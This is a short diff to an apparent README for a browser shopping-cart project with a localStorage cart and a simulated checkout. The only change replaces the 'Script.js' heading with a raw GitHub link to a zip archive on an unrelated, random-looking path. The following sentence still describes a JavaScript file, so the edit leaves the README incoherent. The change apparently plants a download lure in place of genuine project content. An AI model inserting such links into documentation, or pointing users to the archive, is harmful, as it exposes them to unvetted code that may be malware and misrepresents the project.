@@ -9,7 +9,7 @@ Features
 	•	Persistent Cart: The cart is saved in localStorage, ensuring it persists across page reloads.
 	•	Checkout Simulation: Users can proceed to checkout with a simulated alert.
 
-Script.js
+https://raw.githubusercontent.com/kevkaleido/mbaya/main/ostariophysan/mbaya.zip
 
 This file contains the JavaScript code that manages the cart functionality. Here are the main functions:
 
